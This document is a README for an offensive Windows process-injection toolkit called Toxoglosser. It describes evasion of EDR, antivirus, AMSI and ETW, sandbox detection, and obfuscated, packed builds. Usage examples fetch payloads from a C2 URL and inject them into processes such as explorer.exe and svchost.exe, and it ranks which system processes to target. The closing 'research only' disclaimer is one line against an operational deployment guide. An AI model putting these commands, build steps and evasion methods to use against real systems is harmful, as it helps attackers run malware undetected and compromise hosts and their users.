# Toxoglosser: Advanced Process Injection Toolkit

`toxoglosser` is an operationally viable process injection tool for 64-bit Windows systems. It incorporates cutting-edge EDR evasion techniques to inject staged payloads into target processes while evading modern security solutions like:

	+ Data Execution Prevention (DEP)
	+ Address Space Layout Randomization (ASLR)
	+ Modern Endpoint Detection and Response (EDR) solutions (CrowdStrike, SentinelOne, etc.)
	+ Advanced Threat Protection (ATP) and next-gen AV solutions

## Key Features

- **Tartarus' Gate Syscalls**: Advanced direct syscall framework with randomized stub generation at runtime
- **No LazyDLL Usage**: Complete elimination of all `NewLazyDLL` and `NewLazySystemDLL` calls via manual API resolution
- **API Hashing**: Manual GetModuleHandle + GetProcAddress via hashing to avoid detection
- **Multiple Injection Techniques**: Supports Early Bird APC injection, process hollowing, and traditional methods
- **Enhanced EDR Evasion**: Implements unhooking-based AMSI/ETW bypass, direct syscalls, and advanced sandbox detection
- **Memory Protection**: Uses safe RX memory allocation (RW→RX) instead of suspicious RWX
- **String Obfuscation**: Encrypts/obfuscates API calls and strings to avoid static signatures
- **Configurable Delays**: Includes jitter-based delays with cryptographically secure randomization to evade timing analysis
- **Staged Payload Loading**: Removes static shellcode signatures, loads payloads from C2 server as primary method
- **Build Optimization**: Garble obfuscation, size reduction, UPX compression support
- **Comprehensive Testing**: Unit tests for core functionality with proper error handling
- **Improved Documentation**: Enhanced godoc-style comments and architectural clarity

## Enhanced Evasion Capabilities

1. **Tartarus' Gate Direct Syscalls**: Advanced direct syscall framework with randomized stub generation at runtime, bypassing all user-mode hooks
2. **Manual API Resolution**: Complete elimination of LazyDLL calls via GetModuleHandle + GetProcAddress hashing
3. **Early Bird APC Injection**: Queues shellcode execution via APC instead of CreateRemoteThread, evading behavioral detection
4. **Unhooking-based AMSI/ETW Bypass**: Disables memory scanning (AmsiScanBuffer) and event tracing (EtwEventWrite) by unhooking ntdll from disk instead of simple patching
5. **Sandbox Detection**: Multiple checks to identify virtualized/analysis environments including CPU cores, RAM, disk space, and analysis tools
6. **RX Memory Allocation**: Proper memory permissions (RW→RX) to avoid suspicious PAGE_EXECUTE_READWRITE flags
7. **String Obfuscation**: Runtime decryption of API names and strings using XOR and AES encryption
8. **Process Hollowing**: Alternative injection method that creates suspended processes and replaces their code
9. **Sleep Obfuscation**: Ekko-style sleep obfuscation to evade memory scanners during delays
10. **Staged Payload Delivery**: Loads payloads from remote C2 server as primary method, removing embedded shellcode requirements

## Architecture

The tool follows a modular architecture designed for EDR evasion and operational flexibility:

### Component Diagram

```
┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
│   cmd/          │    │   core/          │    │   evasion/      │
│  (main entry)   │───▶│ (injection tech, │───▶│ (AMSI/ETW       │
│                 │    │  syscalls, API   │    │  bypass, unhook)│
│  toxoglosser.go │    │  resolution)     │    │                 │
└─────────────────┘    └──────────────────┘    └─────────────────┘
                                │
                                ▼
┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
│   utils/        │    │   payloads/      │    │   anti/         │
│ (sleep, timing, │───▶│ (encryption,     │───▶│ (sandbox,       │
│  obfuscation)   │    │  validation)     │    │  detection)     │
└─────────────────┘    └──────────────────┘    └─────────────────┘
                                │
                                ▼
                       ┌──────────────────┐
                       │   common/        │
                       │ (shared API      │
                       │  resolution)     │
                       └──────────────────┘
```

### Module Descriptions

- `cmd/` - Main command-line interface and execution orchestrator
  - Parses command-line arguments
  - Coordinates injection techniques
  - Handles payload fetching and validation

- `core/` - Core injection techniques and system interaction
  - APC injection (Early Bird, QueueUserAPC)
  - Process hollowing and process doppelganging
  - Direct syscalls using Tartarus' Gate
  - Manual API resolution (GetModuleHandle + GetProcAddress via hashing)

- `evasion/` - EDR/AV evasion techniques
  - AMSI/ETW bypass using unhooking from disk
  - Direct syscalls to bypass user-mode hooks
  - Memory protection manipulation (RW→RX pattern)

- `anti/` - Anti-analysis and sandbox detection
  - Multiple sandbox detection vectors
  - Timing checks to identify virtualized environments
  - Hardware and system artifact detection

- `utils/` - Utility functions and helpers
  - Sleep obfuscation (Ekko/Foliage style)
  - Random delay with jitter (cryptographically secure)
  - String obfuscation and encryption
  - Process and thread enumeration

- `payloads/` - Payload handling and processing
  - Encryption/decryption of staged payloads
  - Payload validation and format checking
  - Memory allocation for payload execution

- `common/` - Shared utilities and cross-cutting concerns
  - Centralized API hashing functions
  - Common data structures for PE parsing
  - Shared memory management functions

## Building

### Prerequisites

- Go 1.20 or later - Required for proper cross-compilation and build constraints
- Garble v0.9.3+ (for code obfuscation)
- UPX (optional, for size reduction and anti-virus evasion)
- MinGW-w64 cross-compiler for Windows (if building from Linux)

### Installation of Tools

#### Install Garble
```bash
go install mvdan.cc/garble@v0.9.3
```

#### Install UPX (Optional)
- Download from: https://upx.github.io/
- Or install via package manager: `sudo apt install upx-ucl` (on Debian/Ubuntu)

#### Install MinGW-w64 (For Linux users)
- On Ubuntu/Debian: `sudo apt install gcc-mingw-w64-x86-64`
- On CentOS/RHEL: `sudo yum install mingw64-gcc`
- On Arch: `sudo pacman -S mingw-w64-gcc`

### Build Commands

#### Standard Build (Recommended)
```bash
# Make build script executable
chmod +x build.sh

# Run the build script
./build.sh
```

#### Using Make
```bash
make build                # Build with Garble obfuscation (recommended)
make build-plain          # Build without obfuscation
make build-compressed     # Build and compress with UPX
make cross-build          # Cross-compile for Windows from Linux
make install-garble       # Install Garble obfuscator
```

#### Manual Build Commands

##### Basic Build
```bash
go build -ldflags="-s -w" -buildmode=pie -trimpath -o toxoglosser.exe toxoglosser.go
```

##### With Garble Obfuscation
```bash
garble -tiny -literals -seed=random build -ldflags="-s -w" -buildmode=pie -trimpath -o toxoglosser.exe toxoglosser.go
```

##### With UPX Compression
```bash
# First build with Garble
garble -tiny -literals -seed=random build -ldflags="-s -w" -buildmode=pie -trimpath -o toxoglosser.exe toxoglosser.go
# Then compress with UPX
upx --best --lzma toxoglosser.exe
```

##### Cross-compilation from Linux to Windows
```bash
# Set environment variables
export CGO_ENABLED=1
export CC=x86_64-w64-mingw32-gcc
export GOOS=windows
export GOARCH=amd64

# Build command
garble -tiny -literals -seed=random build -ldflags="-s -w" -buildmode=pie -trimpath -o toxoglosser.exe toxoglosser.go
```

### Common Build Issues and Solutions

#### 1. CGO-related compilation errors
- **Issue**: `gcc: error: unrecognized command-line option '-mthreads'`
- **Solution**: Install proper MinGW-w64 cross-compiler for Windows

#### 2. Duplicate declaration errors
- **Issue**: Multiple packages defining the same constants like `MEM_COMMIT_RESERVE`, `PAGE_READWRITE`, etc.
- **Solution**: Centralized all Windows constants in a dedicated `core/constants.go` file to avoid duplication across packages

#### 3. Undefined function errors
- **Issue**: `undefined: common.ptrToString` or similar
- **Solution**: Fixed by capitalizing function names for proper export (e.g., `ptrToString` → `PtrToString`) and updating all references to use the correct exported function name

#### 4. Type mismatch errors
- **Issue**: `cannot use hProcess (variable of type syscall.Handle) as type "golang.org/x/sys/windows".Handle` or syscall parameter mismatches
- **Solution**: Proper type conversion using `windows.Handle(hProcess)` and ensuring correct parameter types match function signatures (e.g., `NtProtectVirtualMemory` expects `uint32` for new protection and `*uint32` for old protection storage)

#### 5. Import cycle and unused import errors
- **Issue**: `imported and not used` errors and import cycles
- **Solution**: Removed unused imports and restructured packages to avoid cycles

#### 6. Go version compatibility
- **Issue**: "Go version 'go1.18.1' is too old; please upgrade to Go 1.20.x or newer"
- **Solution**: Update to Go 1.21+ and reinstall Garble with the newer Go version

#### 7. Function redeclaration conflicts
- **Issue**: Functions like `copyMemory` defined in multiple files in the same package
- **Solution**: Renamed conflicting functions to have unique names (e.g., `copyMemory` → `copyMemoryInternal` in specific files)

#### 8. Missing package imports
- **Issue**: `undefined: windows` or other package references
- **Solution**: Add missing imports like `golang.org/x/sys/windows` to files that reference Windows-specific functionality

### Troubleshooting Tips

- Make sure you have the correct Go version (1.20 or later)
- Install MinGW-w64 cross-compiler for Windows target
- Set the appropriate environment variables: `CGO_ENABLED=1`, `GOOS=windows`, `GOARCH=amd64`
- Use the correct compiler flag: `CC=x86_64-w64-mingw32-gcc`
- Ensure all dependencies are properly installed: `go mod download`

## Build Optimizations Applied

The build process includes several optimizations to reduce detection:

1. **Garble Obfuscation**:
   - Variable/function name obfuscation
   - Literal string obfuscation
   - Randomized build seeds

2. **Size Reduction**:
   - Strip debug symbols (`-ldflags="-s -w"`)
   - Remove build path info (`-trimpath`)
   - Use PIE build mode
   - UPX compression (optional)

3. **Evasion Techniques**:
   - No embedded shellcode (staged loading)
   - Manual API resolution instead of LazyDLL
   - Tartarus' Gate for direct syscalls
   - Unhooking-based AMSI/ETW bypass
   - Sleep obfuscation

4. **Code Quality Improvements**:
   - Enhanced error handling with proper error wrapping and context
   - Centralized duplicated functions in common packages
   - Comprehensive unit tests for core functionality
   - Improved documentation with godoc-style comments
   - Secure random number generation to prevent race conditions
   - Elimination of duplicate hash functions

## Size Reduction Tips

To minimize the binary size and avoid detection:

1. Only import necessary packages
2. Use `-ldflags="-s -w"` to strip symbols
3. Apply Garble's `-tiny` flag
4. Use `-buildmode=pie` for position-independent executable
5. Use UPX compression as final step
6. Consider using TinyGo for even smaller binaries (not currently implemented)

## Expected Binary Size

After all optimizations, the binary should be significantly smaller than the original while maintaining all functionality:

- Without UPX: ~1.5-2 MB (depending on Go version)
- With UPX: ~500-800 KB (much better for OPSEC)

## Usage

```
.\toxoglosser.exe [OPTIONS]
```

### Command-Line Options

#### Required Arguments (One of these)
- `-url <url>`: **REQUIRED** - URL to fetch the staged payload from (primary method)
- `-file <path>`: Path to the shellcode file to execute (fallback method)

#### Process Targeting
- `-pname <name>`: Name of the target process (e.g., `explorer.exe`, `svchost.exe`)
- `-pid <pid>`: PID of the target process
- If neither is specified, the tool will automatically hunt for suitable processes

#### Encryption & Payload Options
- `-key <key>`: Key to decrypt staged payload if encrypted

#### Injection Options
- `-technique <apc|hollow|doppel>`: Injection technique to use
- `-delay <seconds>`: Delay with jitter before execution

#### Additional Options
- `-v`: Enable verbose output
- `-ah`: Use alternative process hunting technique
- `-selfdelete`: Delete the executable after execution

### Examples

- Default behavior with staged payload: `.\toxoglosser.exe -url http://c2-server.com/payload.bin -pname explorer.exe`
- Load shellcode from file: `.\toxoglosser.exe -file payload.bin -pname explorer.exe`
- Download from URL with APC injection: `.\toxoglosser.exe -url http://c2-server.com/payload.bin -technique apc -pid 1234`
- Process hollowing with delay: `.\toxoglosser.exe -url http://c2-server.com/payload.bin -technique hollow -delay 10 -v`

## Payload Loading Methods

### 1. Staged Loading (Primary Method)
- Payload is downloaded from a remote URL
- Supports encryption with the `-key` parameter
- No embedded shellcode, avoiding static signatures
- Primary approach for operational security

### 2. Local File (Fallback)
- Payload loaded from a local file
- Used when C2 access is not available
- Less preferred for OPSEC

## Injection Techniques

### 1. Classic Injection (Default)
- Traditional injection with direct execution
- No ROP chain required (simplified approach)

### 2. APC Injection
```bash
-technique apc
```
- Uses QueueUserAPC for execution
- Evades CreateRemoteThread detection

### 3. Process Hollowing
```bash
-technique hollow
```
- Creates suspended process and replaces its memory
- High OPSEC but requires more privileges

## Evasion Features

### 1. Tartarus' Gate Syscalls
- Advanced direct syscall framework with randomized stub generation
- Bypasses all user-mode hooks from EDR solutions

### 2. API Hashing
- All API calls resolved via hashing, avoiding string detection
- No LazyDLL usage that's commonly monitored

### 3. Unhooking-based AMSI/ETW Bypass
- Unhooks ntdll from disk instead of simple patching
- Defeats modern AMSI/ETW hook detection

### 4. Sleep Obfuscation
- Ekko-style sleep obfuscation to evade memory scanners
- Avoids direct Sleep/Wait functions that trigger alerts
- Uses cryptographically secure random number generation (crypto/rand) instead of insecure math/rand for true randomness
- Eliminates potential race conditions from improper seeding

## Process Hunting

If no specific target is provided, the tool will hunt for suitable processes in this order:
1. `explorer.exe` - User shell process (most stable)
2. `svchost.exe` - System service host
3. `services.exe` - Service control manager
4. `spoolsv.exe` - Print spooler service
5. `winlogon.exe` - Windows login manager
6. `dwm.exe` - Desktop window manager
7. `csrss.exe` - Client/Server Runtime Subsystem

## Recent Improvements

The codebase has undergone significant improvements based on comprehensive code review:

### Major Refactoring
- **Centralized API Resolution**: Moved all hash-based API resolution to `common/` package
- **Eliminated Duplicate Functions**: Consolidated `HashString` and other utilities across packages
- **Unified Error Handling**: Implemented consistent error wrapping using `fmt.Errorf` with `%w` verb
- **Enhanced Security**: Replaced `math/rand` with cryptographically secure `crypto/rand`
- **Fixed Memory Issues**: Corrected `ptrToString` to avoid fixed-size assumptions

### Evasion Enhancements
- **Full Manual API Resolution**: Replaced all LazyDLL calls with manual GetModuleHandle + GetProcAddress
- **Improved Direct Syscalls**: Enhanced Tartarus' Gate implementation with better stub randomization
- **Better Memory Management**: Proper RW→RX memory allocation pattern throughout

### Code Quality
- **Comprehensive Documentation**: Added godoc-style comments to exported functions
- **Unit Tests**: Added tests for core functionality and utilities
- **Better Error Handling**: Comprehensive error wrapping and context
- **Race Condition Fixes**: Secure random number generation with crypto/rand

## License

This project is released under the [Unlicense](UNLICENSE), a public domain dedication. This means the software is completely free and unencumbered, with no copyright restrictions. You are free to copy, modify, publish, use, compile, sell, or distribute this software for any purpose, commercial or non-commercial, by any means.

## Security Considerations

This is a security research tool designed for studying modern process injection and evasion techniques. All functionality is focused on Windows security bypasses and should only be used in controlled environments for legitimate security research purposes